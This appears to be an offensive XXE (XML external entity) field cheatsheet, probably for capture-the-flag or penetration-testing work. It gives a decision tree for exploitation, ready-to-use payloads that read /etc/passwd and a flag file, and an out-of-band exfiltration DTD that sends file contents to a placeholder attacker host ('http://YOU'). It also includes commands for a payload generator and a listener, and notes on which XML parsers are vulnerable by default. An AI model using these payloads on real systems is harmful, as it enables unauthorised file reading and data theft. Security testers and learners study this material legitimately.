# XXE Cheatsheet — the field card

## The decision tree — 30 seconds to the right module

```
XML input found?
├─ &probe; echoes?  YES → entities expand → next rung
│                   NO  → XInclude? → no → dead
├─ file:///etc/passwd echoes? YES → read files → file-read.md
│                         NO  → external-entities off? → error/blind
├─ %d SYSTEM fetch hits you? YES → param-entities live → blind-xxe.md
│                        NO  → egress dead → local-dtd/error
├─ DOCTYPE refused? → XInclude → xinclude.md
├─ upload surface? → svg/ooxml/misc-formats
├─ SOAP/XML-RPC? → soap-wsdl.md
├─ SAML? → saml.md
└─ content-type-confusion? → content-type-confusion.md
```

## The first-file table

| OS | Read |
|---|---|
| Linux | `file:///etc/passwd` |
| Windows | `file:///c:/windows/win.ini` |
| Unknown | `file:///etc/hostname` or try both |

## The entity forms

```xml
<!ENTITY x "v">                          internal general
<!ENTITY x SYSTEM "URI">                 external general
<!ENTITY % p "v">                        internal param (DTD-only)
<!ENTITY % p SYSTEM "URI">               external param (DTD-only)
<!ENTITY u SYSTEM "URI" NDATA n>         unparsed
```

## The payloads that matter

```xml
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://YOU/d.dtd">%d;]><r>&x;</r>
<xi:include href="file:///flag" parse="text"/>
<?xml-stylesheet href="http://YOU/x.xsl"?>
```

## The exfil-DTD

```dtd
<!ENTITY % f SYSTEM "file:///flag">
<!ENTITY % w "<!ENTITY s SYSTEM 'http://YOU/?x=%f;'>">
%w;
```

## The parser defaults — one-line

- Java `DocumentBuilder`/`SAXParser` raw → external entities YES
- .NET `XmlReader` default → `DtdProcessing.Prohibit` → dead
- Python `lxml`/`minidom`/`sax` → external YES; `ElementTree` internal-only
- PHP `simplexml`/`DOMDocument` → external only with `LIBXML_NOENT`
- Node `xml2js`/`xmldom` → internal-only → dead
- Go `encoding/xml` → no entities → dead

## The errors that fingerprint

| See | Parser |
|---|---|
| `SAXParseException` | Java |
| `XmlException`/`DTD is prohibited` | .NET |
| `libxml`/`simplexml` warnings | PHP |
| `XMLSyntaxError`/`lxml`/`ElementTree` | Python |
| `EntitiesForbidden` | defusedxml |

## The tools

```bash
python3 tools/web/xxe_gen.py --probe
python3 tools/web/xxe_gen.py --file /etc/passwd
python3 tools/web/xxe_gen.py --oob http://YOU/
python3 tools/web/oob_listener.py serve --port 8000 --log /tmp/o.log
python3 tools/web/oob_listener.py hits --log /tmp/o.log
```

## The budget

5 probes/15 min per mechanism layer. Change layer on exhaustion.

## Falsifiers — kill conditions

- `&probe;` no echo + XInclude refused → dead
- `DOCTYPE prohibited` + no XInclude → dead on this surface
- egress dead AND in-band dead → local-DTD or pivot
